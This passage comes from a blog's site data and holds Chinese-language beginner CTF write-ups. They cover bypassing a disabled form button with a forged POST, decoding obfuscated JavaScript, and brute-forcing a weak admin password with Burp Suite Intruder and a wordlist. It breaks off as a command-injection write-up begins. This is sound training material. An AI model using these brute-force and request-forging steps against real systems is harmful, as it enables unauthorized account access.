class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth">\n\n\n1\n\n\n保存后页面中的这个button即可点击，点击后得到flag。\n\n\n# 解题思路2：模拟页面上的表单提交，绕过按钮直接请求\n\n查看官方writeup后，找到了另一种方法，具体操作是鼠标右键，查看网页源代码，找到这个表单\n\n<form action="" method="post" >\n    <input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />\n</form>\n\n\n1\n2\n3\n\n\n我们可以看到，这个form表单的方法是post，这个button的name属性是auth，而value属性是flag，根据html基础得知，这里如果点击后，会产生一个form表单提交，参数是auth=flag，官方writeup题解使用了工具hackbar，我使用的是postman，向服务器发送一个post请求，返回中即可找到flag\n\n',charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-07",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-07",date:"2024-11-17T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-17-2-CTF-simple_js-WriteUp.html",relativePath:"views/essay/2024-11-17-2-CTF-simple_js-WriteUp.md",key:"v-11397070",path:"/views/essay/2024-11-17-2-CTF-simple_js-WriteUp.html",headers:[{level:3,title:"题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )",slug:"题目描述-小宁发现了一个网页-但却一直输不对密码。-flag格式为-cyberpeace-xxxxxxxxx",normalizedTitle:"题目描述：小宁发现了一个网页，但却一直输不对密码。(flag格式为 cyberpeace{xxxxxxxxx} )",charIndex:48},{level:3,title:"考点1： JavaScript基础",slug:"考点1-javascript基础",normalizedTitle:"考点1： javascript基础",charIndex:109},{level:3,title:"考点2： Ascii码特征",slug:"考点2-ascii码特征",normalizedTitle:"考点2： ascii码特征",charIndex:130},{level:3,title:"考点3：16进制数的特征",slug:"考点3-16进制数的特征",normalizedTitle:"考点3：16进制数的特征",charIndex:147},{level:3,title:"解题思路1：读JavaScript语句，找出怪异的部分",slug:"解题思路1-读javascript语句-找出怪异的部分",normalizedTitle:"解题思路1：读javascript语句，找出怪异的部分",charIndex:163},{level:3,title:"解题思路2：理解并修改JavaScript语句，用JavaScript来解开密文",slug:"解题思路2-理解并修改javascript语句-用javascript来解开密文",normalizedTitle:"解题思路2：理解并修改javascript语句，用javascript来解开密文",charIndex:194}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第7题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0480</td>\n<td>simple_js</td>\n<td>Web</td>\n<td>3</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 考点1： JavaScript基础 考点2： Ascii码特征 考点3：16进制数的特征 解题思路1：读JavaScript语句，找出怪异的部分 解题思路2：理解并修改JavaScript语句，用JavaScript来解开密文",content:'根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第7题\n\n\n\n * 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )\n * 考点1： JavaScript基础\n * 考点2： Ascii码特征\n * 考点3：16进制数的特征\n * 解题思路1：读JavaScript语句，找出怪异的部分\n * 解题思路2：理解并修改JavaScript语句，用JavaScript来解开密文\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称        题目方向   难度\nGFSJ0480   simple_js   Web    3\n\n\n# 题目7：simple_js\n\n\n# 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )\n\n\n# 考点1： JavaScript基础\n\n\n# 考点2： Ascii码特征\n\n\n# 考点3：16进制数的特征\n\n\n# 解题思路1：读JavaScript语句，找出怪异的部分\n\n点开目标网页后，提示让输入密码，我们直接打开F12开发者工具，随便输入一个密码，监看Network的返回，这时候产生了一个指向服务器ip的请求，查看请求的返回体Response\n\n\n\n将这个Response复制出来，可以得到如下内容\n\n<html>\n<head>\n    <title>JS</title>\n    <script type="text/javascript">\n    function dechiffre(pass_enc){\n        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";\n        var tab  = pass_enc.split(\',\');\n                var tab2 = pass.split(\',\');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;\n                        k = j + (l) + (n=0);\n                        n = tab2.length;\n                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));\n                                if(i == 5)break;}\n                        for(i = (o=0); i < (k = j = n); i++ ){\n                        o = tab[i-l];\n                                if(i > 5 && i < k-1)\n                                        p += String.fromCharCode((o = tab2[i]));\n                        }\n        p += String.fromCharCode(tab2[17]);\n        pass = p;return pass;\n    }\n    String["fromCharCode"](dechiffre("\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30"));\n\n    h = window.prompt(\'Enter password\');\n    alert( dechiffre(h) );\n\n<\/script>\n</head>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n根据这段代码的最后几行可以得出，我们不论输入什么，最终都会走到alert弹，我们重点关注以下内容\n\n(dechiffre("\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30"));\n\n\n1\n\n\n观察这段密文的特征，猜测应该是16进制数，在CTF竞赛中，转义字符\\x35也常用于表示特定的字符或进行编码操作。例如，使用cout << "\\x35"在C++中输出的是ASCII码为53的字符，即字符\'5\'‌\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n   cout << "\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30";\n   return 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n此时我们得运行得到了输出\n\n55,56,54,79,115,69,114,116,107,49,50\n\n\n1\n\n\n观察这一串数字，我们猜测应该是ascii码，通过程序或者手动对照ascii表，我们可以得到目标字符串\n\n#!/usr/bin/python\n# Write Python 3 code in this online editor and run it.\ns= "\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30"\nprint(s);\ns = s.split(",")\nc = ""\nfor i in s:\n\ti = chr(int(i))\n\tc = c+i\nprint(c)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n此时输出结果，我们就能得到想要的flag\n\n> \\x35这样的十六进制和1A或者3F这样的十六进制为什么不一样\n> \n>  1. 表示形式的差异\n>     * \\x35是一种在编程语言中常见的转义字符序列，用于表示一个字节（8 位）的十六进制值。在这里，\\x是转义序列的开头标志，后面跟着两位十六进制数字（35），它表示的是一个字符的 ASCII 码（或其他字符编码）的十六进制值。在 ASCII 码中，\\x35对应的字符是5。\n>     * 而1A和3F是单纯的十六进制数的表示形式。它们没有像\\x这样的转义序列前缀，只是直接以十六进制的格式呈现数字。在十六进制中，1A代表十进制的 26，3F代表十进制的 63。\n>  2. 用途的不同\n>     * \\x35主要用于在字符串或字符数据的表示中，例如在 C、C++、Python 等编程语言中，当你想要在字符串中插入一个特殊字符或者非打印字符（通过其 ASCII 码或其他编码的十六进制值）时，就会使用这种转义序列。比如在 C 语言中，char c=\\x35;就定义了一个字符变量c，其值为字符5。\n>     * 1A和3F这样的十六进制数可以用于多种用途，如在内存地址表示、文件格式中的数据标记（例如在一些二进制文件格式中，特定的十六进制值表示文件头、数据块等不同部分）、数学计算（十六进制数之间的运算）等场景。例如，在分析一个十六进制格式的文件时，1A和3F这样的十六进制值可能代表文件中的不同数据部分或者标记。\n\n> 其他的转义字符有：\n> \n>  1. 简单的转义字符，如\\n \\t \\d\n>  2. \\x开头的十六进制转义字符，如\\x35 \\x34\n>  3. \\u开头的 Unicode 转义序列，如\\u4F60\n\n\n# 解题思路2：理解并修改JavaScript语句，用JavaScript来解开密文\n\n从用户huang8huang的WP学习到，我们可以简化该JavaScript代码，最终得到如下代码\n\nfunction dechiffre() {\n    var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";\n    var tab2 = pass.split(\',\');\n    var i;\n    var p = "";\n    for (i = 0; i < tab2.length; i++) {\n        p += String.fromCharCode(tab2[i]);\n    }\n    return p;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n就逻辑上可见它只是将内容为逗号分隔的数字的字符串转成相应编码的字符串。\n\n将代码修改，用下方的可疑字符串代替函数中的常量，得到的整个网页代码是：\n\n<html>\n<head>\n    <title>JS</title>\n    <script type="text/javascript">\nfunction dechiffre() {\n    var pass = "\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30";\n    var tab2 = pass.split(\',\');\n    var i;\n    var p = "";\n    for (i = 0; i < tab2.length; i++) {\n        p += String.fromCharCode(tab2[i]);\n    }\n    return p;\n}\nalert(dechiffre());\n<\/script>\n</head>\n<body></body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第7题\n\n\n\n * 题目描述：小宁发现了一个网页，但却一直输不对密码。(flag格式为 cyberpeace{xxxxxxxxx} )\n * 考点1： javascript基础\n * 考点2： ascii码特征\n * 考点3：16进制数的特征\n * 解题思路1：读javascript语句，找出怪异的部分\n * 解题思路2：理解并修改javascript语句，用javascript来解开密文\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称        题目方向   难度\ngfsj0480   simple_js   web    3\n\n\n# 题目7：simple_js\n\n\n# 题目描述：小宁发现了一个网页，但却一直输不对密码。(flag格式为 cyberpeace{xxxxxxxxx} )\n\n\n# 考点1： javascript基础\n\n\n# 考点2： ascii码特征\n\n\n# 考点3：16进制数的特征\n\n\n# 解题思路1：读javascript语句，找出怪异的部分\n\n点开目标网页后，提示让输入密码，我们直接打开f12开发者工具，随便输入一个密码，监看network的返回，这时候产生了一个指向服务器ip的请求，查看请求的返回体response\n\n\n\n将这个response复制出来，可以得到如下内容\n\n<html>\n<head>\n    <title>js</title>\n    <script type="text/javascript">\n    function dechiffre(pass_enc){\n        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";\n        var tab  = pass_enc.split(\',\');\n                var tab2 = pass.split(\',\');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;\n                        k = j + (l) + (n=0);\n                        n = tab2.length;\n                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += string.fromcharcode((o = tab2[i]));\n                                if(i == 5)break;}\n                        for(i = (o=0); i < (k = j = n); i++ ){\n                        o = tab[i-l];\n                                if(i > 5 && i < k-1)\n                                        p += string.fromcharcode((o = tab2[i]));\n                        }\n        p += string.fromcharcode(tab2[17]);\n        pass = p;return pass;\n    }\n    string["fromcharcode"](dechiffre("\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30"));\n\n    h = window.prompt(\'enter password\');\n    alert( dechiffre(h) );\n\n<\/script>\n</head>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n根据这段代码的最后几行可以得出，我们不论输入什么，最终都会走到alert弹，我们重点关注以下内容\n\n(dechiffre("\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30"));\n\n\n1\n\n\n观察这段密文的特征，猜测应该是16进制数，在ctf竞赛中，转义字符\\x35也常用于表示特定的字符或进行编码操作。例如，使用cout << "\\x35"在c++中输出的是ascii码为53的字符，即字符\'5\'‌\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n   cout << "\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30";\n   return 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n此时我们得运行得到了输出\n\n55,56,54,79,115,69,114,116,107,49,50\n\n\n1\n\n\n观察这一串数字，我们猜测应该是ascii码，通过程序或者手动对照ascii表，我们可以得到目标字符串\n\n#!/usr/bin/python\n# write python 3 code in this online editor and run it.\ns= "\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30"\nprint(s);\ns = s.split(",")\nc = ""\nfor i in s:\n\ti = chr(int(i))\n\tc = c+i\nprint(c)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n此时输出结果，我们就能得到想要的flag\n\n> \\x35这样的十六进制和1a或者3f这样的十六进制为什么不一样\n> \n>  1. 表示形式的差异\n>     * \\x35是一种在编程语言中常见的转义字符序列，用于表示一个字节（8 位）的十六进制值。在这里，\\x是转义序列的开头标志，后面跟着两位十六进制数字（35），它表示的是一个字符的 ascii 码（或其他字符编码）的十六进制值。在 ascii 码中，\\x35对应的字符是5。\n>     * 而1a和3f是单纯的十六进制数的表示形式。它们没有像\\x这样的转义序列前缀，只是直接以十六进制的格式呈现数字。在十六进制中，1a代表十进制的 26，3f代表十进制的 63。\n>  2. 用途的不同\n>     * \\x35主要用于在字符串或字符数据的表示中，例如在 c、c++、python 等编程语言中，当你想要在字符串中插入一个特殊字符或者非打印字符（通过其 ascii 码或其他编码的十六进制值）时，就会使用这种转义序列。比如在 c 语言中，char c=\\x35;就定义了一个字符变量c，其值为字符5。\n>     * 1a和3f这样的十六进制数可以用于多种用途，如在内存地址表示、文件格式中的数据标记（例如在一些二进制文件格式中，特定的十六进制值表示文件头、数据块等不同部分）、数学计算（十六进制数之间的运算）等场景。例如，在分析一个十六进制格式的文件时，1a和3f这样的十六进制值可能代表文件中的不同数据部分或者标记。\n\n> 其他的转义字符有：\n> \n>  1. 简单的转义字符，如\\n \\t \\d\n>  2. \\x开头的十六进制转义字符，如\\x35 \\x34\n>  3. \\u开头的 unicode 转义序列，如\\u4f60\n\n\n# 解题思路2：理解并修改javascript语句，用javascript来解开密文\n\n从用户huang8huang的wp学习到，我们可以简化该javascript代码，最终得到如下代码\n\nfunction dechiffre() {\n    var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";\n    var tab2 = pass.split(\',\');\n    var i;\n    var p = "";\n    for (i = 0; i < tab2.length; i++) {\n        p += string.fromcharcode(tab2[i]);\n    }\n    return p;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n就逻辑上可见它只是将内容为逗号分隔的数字的字符串转成相应编码的字符串。\n\n将代码修改，用下方的可疑字符串代替函数中的常量，得到的整个网页代码是：\n\n<html>\n<head>\n    <title>js</title>\n    <script type="text/javascript">\nfunction dechiffre() {\n    var pass = "\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30";\n    var tab2 = pass.split(\',\');\n    var i;\n    var p = "";\n    for (i = 0; i < tab2.length; i++) {\n        p += string.fromcharcode(tab2[i]);\n    }\n    return p;\n}\nalert(dechiffre());\n<\/script>\n</head>\n<body></body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-09",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-09",date:"2024-11-17T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-17-4-CTF-weak_auth-WriteUp.html",relativePath:"views/essay/2024-11-17-4-CTF-weak_auth-WriteUp.md",key:"v-7b7ddd12",path:"/views/essay/2024-11-17-4-CTF-weak_auth-WriteUp.html",headers:[{level:3,title:"题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。",slug:"题目描述-小宁写了一个登陆验证页面-随手就设了一个密码。",normalizedTitle:"题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。",charIndex:48},{level:3,title:"考点1：常见弱口令",slug:"考点1-常见弱口令",normalizedTitle:"考点1：常见弱口令",charIndex:80},{level:3,title:"考点2： 掌握基本的爆破方法",slug:"考点2-掌握基本的爆破方法",normalizedTitle:"考点2： 掌握基本的爆破方法",charIndex:93},{level:3,title:"解题思路1：尝试使用Burp爆破密码",slug:"解题思路1-尝试使用burp爆破密码",normalizedTitle:"解题思路1：尝试使用burp爆破密码",charIndex:111},{level:4,title:"（一）进入页面，完成基本操作",slug:"一-进入页面-完成基本操作",normalizedTitle:"（一）进入页面，完成基本操作",charIndex:340},{level:4,title:"（二）安装Chrome插件，设置代理",slug:"二-安装chrome插件-设置代理",normalizedTitle:"（二）安装chrome插件，设置代理",charIndex:459},{level:4,title:"（三）安装Burp，拦截请求",slug:"三-安装burp-拦截请求",normalizedTitle:"（三）安装burp，拦截请求",charIndex:572},{level:4,title:"（四）设置重发器",slug:"四-设置重发器",normalizedTitle:"（四）设置重发器",charIndex:797},{level:4,title:"（五）下载密码字典，使用攻击器爆破",slug:"五-下载密码字典-使用攻击器爆破",normalizedTitle:"（五）下载密码字典，使用攻击器爆破",charIndex:976}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第9题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0482</td>\n<td>weak_auth</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 考点1：常见弱口令 考点2： 掌握基本的爆破方法 解题思路1：尝试使用Burp爆破密码 （一）进入页面，完成基本操作 （二）安装Chrome插件，设置代理 （三）安装Burp，拦截请求 （四）设置重发器 （五）下载密码字典，使用攻击器爆破",content:"根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第9题\n\n\n\n * 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。\n * 考点1：常见弱口令\n * 考点2： 掌握基本的爆破方法\n * 解题思路1：尝试使用Burp爆破密码\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称        题目方向   难度\nGFSJ0482   weak_auth   Web    1\n\n\n# 题目9：weak_auth\n\n\n# 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。\n\n\n# 考点1：常见弱口令\n\n\n# 考点2： 掌握基本的爆破方法\n\n\n# 解题思路1：尝试使用Burp爆破密码\n\n# （一）进入页面，完成基本操作\n\n进入靶机地址，我们看到了输入用户和密码的地方，我们先随便输入用户名和密码尝试login，这时弹出了alert，提示“please login as admin”，根据提示，我们把用户名改为admin\n\n# （二）安装Chrome插件，设置代理\n\n我们需要在浏览器安装一个SwitchyOmega的插件，这个插件有助于我们将网页切换代理，指向我们本机形成闭环。\n\n\n\n图中可以看到，我们指向了127.0.0.1的8089端口。\n\n# （三）安装Burp，拦截请求\n\n我们需要在Burp中，新建一个项目，选择Proxy(代理)页面，然后点击Proxy Settings(代理设置)，将端口改为8089。\n\n\n\n保存后，将Intercept is off(拦截关闭)启动，会变为Intercept is on(开启)，我们返回到页面，用户名为admin，密码随意设置一个密码，然后发送一个请求。此时会自动跳转到Burp的页面，即可看到我们拦截下的请求：\n\n\n\n注：以上流程就是抓包\n\n# （四）设置重发器\n\n右键拦截器的页面，找到Send to Repeater(发送到重发器)，此时Repeater的页面会高亮，切换过去后，我们然后点击Send发包，发送后可以看到Response(响应)，在响应中可以看到密码错误的alert弹窗，也可以看到一个“maybe you need a dictionar”(也许你需要一份字典)的提示。\n\n\n\n# （五）下载密码字典，使用攻击器爆破\n\n在Proxy页面中，右键选择“Send to Intruder”(发送到攻击器)，在Intruder页面中，我们在下拉框选择Sniper(狙击手，可能是比喻)。\n\n\n\n然后切换到Payloads(炸药、有效载荷等，也可能是比喻)，点击load加载文件，将我们的dictionar(字典)添加到其中。\n\n\n\n回到攻击器，我们鼠标选中我们输入的密码部分，然后点击Add，即可将密码设置为变量，\n\n\n\n然后点击“Start attack”，此时就会正式开始我们的爆破。\n\n\n\n根据密码正确与否，服务器返回的Response长度不同，我们选择Length(长度)倒序，即可找到最有可能的密码。\n\n\n\n此时查看这条请求的Response，我们可以看到我们想要的flag就在其中\n\n\n\n> 此处用到了几个工具，下面附上这些工具的地址\n> \n>  1. SwitchyOmega 代理管理软件，方便一个浏览器多个代理端口的切换。\n>  2. Burp Suite 代理抓包软件，用于Web应用程序的渗透测试和攻击\n>  3. Blasting_dictionary 爆破字典\n>  4. hackbar 浏览器插件，能够在页面上直接完成 请求/响应内容编辑，完成各种包括但是不限于伪造的工作。【本项目没用到hackbar】",normalizedContent:"根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第9题\n\n\n\n * 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。\n * 考点1：常见弱口令\n * 考点2： 掌握基本的爆破方法\n * 解题思路1：尝试使用burp爆破密码\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称        题目方向   难度\ngfsj0482   weak_auth   web    1\n\n\n# 题目9：weak_auth\n\n\n# 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。\n\n\n# 考点1：常见弱口令\n\n\n# 考点2： 掌握基本的爆破方法\n\n\n# 解题思路1：尝试使用burp爆破密码\n\n# （一）进入页面，完成基本操作\n\n进入靶机地址，我们看到了输入用户和密码的地方，我们先随便输入用户名和密码尝试login，这时弹出了alert，提示“please login as admin”，根据提示，我们把用户名改为admin\n\n# （二）安装chrome插件，设置代理\n\n我们需要在浏览器安装一个switchyomega的插件，这个插件有助于我们将网页切换代理，指向我们本机形成闭环。\n\n\n\n图中可以看到，我们指向了127.0.0.1的8089端口。\n\n# （三）安装burp，拦截请求\n\n我们需要在burp中，新建一个项目，选择proxy(代理)页面，然后点击proxy settings(代理设置)，将端口改为8089。\n\n\n\n保存后，将intercept is off(拦截关闭)启动，会变为intercept is on(开启)，我们返回到页面，用户名为admin，密码随意设置一个密码，然后发送一个请求。此时会自动跳转到burp的页面，即可看到我们拦截下的请求：\n\n\n\n注：以上流程就是抓包\n\n# （四）设置重发器\n\n右键拦截器的页面，找到send to repeater(发送到重发器)，此时repeater的页面会高亮，切换过去后，我们然后点击send发包，发送后可以看到response(响应)，在响应中可以看到密码错误的alert弹窗，也可以看到一个“maybe you need a dictionar”(也许你需要一份字典)的提示。\n\n\n\n# （五）下载密码字典，使用攻击器爆破\n\n在proxy页面中，右键选择“send to intruder”(发送到攻击器)，在intruder页面中，我们在下拉框选择sniper(狙击手，可能是比喻)。\n\n\n\n然后切换到payloads(炸药、有效载荷等，也可能是比喻)，点击load加载文件，将我们的dictionar(字典)添加到其中。\n\n\n\n回到攻击器，我们鼠标选中我们输入的密码部分，然后点击add，即可将密码设置为变量，\n\n\n\n然后点击“start attack”，此时就会正式开始我们的爆破。\n\n\n\n根据密码正确与否，服务器返回的response长度不同，我们选择length(长度)倒序，即可找到最有可能的密码。\n\n\n\n此时查看这条请求的response，我们可以看到我们想要的flag就在其中\n\n\n\n> 此处用到了几个工具，下面附上这些工具的地址\n> \n>  1. switchyomega 代理管理软件，方便一个浏览器多个代理端口的切换。\n>  2. burp suite 代理抓包软件，用于web应用程序的渗透测试和攻击\n>  3. blasting_dictionary 爆破字典\n>  4. hackbar 浏览器插件，能够在页面上直接完成 请求/响应内容编辑，完成各种包括但是不限于伪造的工作。【本项目没用到hackbar】",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-10",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-10",date:"2024-11-19T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-19-1-CTF-command_execution-WriteUp.html",relativePath:"views/essay/2024-11-19-1-CTF-command_execution-WriteUp.md",key:"v-0d79752c",path:"/views/essay/2024-11-19-1-CTF-command_execution-WriteUp.html",headers:[{level:3,title:"题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。",slug:"题目描述-小宁写了个ping功能-但没有写waf-x老师告诉她这是非常危险的-你知道为什么吗。",normalizedTitle:"题目描述：小宁写了个ping功能,但没有写waf,x老师告诉她这是非常危险的，你知道为什么吗。",charIndex:49},{level:3,title:"考点1：Linux基础",slug:"考点1-linux基础",normalizedTitle:"考点1：linux基础",charIndex:100},{level:3,title:"考点2： 熟悉     |     的作用（命令拼接）",slug:"考点2-熟悉-的作用-命令拼接",normalizedTitle:"考点2： 熟悉     |     的作用（命令拼接）",charIndex:null},{level:3,title:"解题思路1：使用命令拼接找到flag相关文件",slug:"解题思路1-使用命令拼接找到flag相关文件",normalizedTitle:"解题思路1：使用命令拼接找到flag相关文件",charIndex:138}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第10题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0484</td>\n<td>command_execution</td>\n<td>Web</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 考点1：Linux基础 考点2： 熟悉     |     的作用（命令拼接） 解题思路1：使用命令拼接找到flag相关文件",content:'根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第10题\n\n\n\n * 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n * 考点1：Linux基础\n * 考点2： 熟悉 | 的作用（命令拼接）\n * 